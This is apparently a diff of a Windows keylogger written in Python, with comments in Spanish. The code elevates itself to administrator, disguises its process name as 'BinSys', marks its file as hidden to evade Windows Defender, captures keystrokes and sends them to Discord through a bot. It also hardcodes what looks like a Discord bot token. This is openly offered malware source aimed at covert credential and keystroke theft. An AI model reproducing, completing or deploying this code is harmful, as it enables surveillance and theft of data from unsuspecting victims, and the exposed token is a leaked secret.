@@ -21,13 +21,6 @@ import threading
 import time
 import winreg
 
-# Startea el programa escondido como proceso de windows
-def start():
-    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-    ctypes.windll.kernel32.SetConsoleTitleW("BinSys")
-    setproctitle.setproctitle("BinSys")
-    os.system("python3 keylogger.py")
-
 # Fuerza a ejecutar el proceso como administrador
 
 def force_admin():
@@ -35,8 +28,14 @@ def force_admin():
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
         return True
     except:
+        print("Excepcion inesperada detectada.")
         return False
         pass
+
+if force_admin == False:
+    print("No se ha podido ejecutar el script como administrador")
+    sys.exit()
+
 # Chequea si el script se ejecuta como administrador
 
 def is_admin():
@@ -49,18 +48,18 @@ if is_admin() == False:
     force_admin()
     if force_admin() == False:
         sys.exit()
-# Esconde el proceso del script al Windows Defender
-def hide_process():
-    try:
-        ctypes.windll.kernel32.SetFileAttributesW("keylogger.py", 2)
-        return True
-    except:
-        return False
-if hide_process() == True:
+
+# Cambia el nombre del proceso del script
+
+def change_name():
+    setproctitle.setproctitle("Binsys")
+    return True
+if change_name() == True:
     pass
-if hide_process() == False:
-    print("Windows defender ha detectado el script, cerrando proceso...")
-    sys.exit()
+if change_name() == False:
+    print("Error al cambiar el nombre del proceso del script")
+    pass
+
 # Instala las dependencias del script
 
 def install():
@@ -73,9 +72,24 @@ def install():
     os.system("pip install threading")
     os.system("pip install time")
     return True
+
 if install == True:
     pass
 if install == False:
+    print("Error al instalar las dependencias del script")
+    sys.exit()
+
+# Esconde el proceso del script al Windows Defender
+def hide_process():
+    try:
+        ctypes.windll.kernel32.SetFileAttributesW("keylogger.py", 2)
+        return True
+    except:
+        return False
+if hide_process() == True:
+    pass
+if hide_process() == False:
+    print("Windows defender ha detectado el script, cerrando proceso...")
     sys.exit()
 
 # Forzar la creación del archivo de texto
@@ -134,7 +148,7 @@ with Listener(on_press=on_press) as listener:
 
 def send_to_discord(channel_id, bot_token):
     channel_id = str("")
-    bot_token = str("")
+    bot_token = str("MTE2MTU1NjE1MDg1NzI0MDYwNg.GQXPB8.n3WcD5o-hMRL_CYlfbQgJ0H0K0nK6z99SHAo7c")
     # Crea un cliente de discord
     client = discord.Client()
 
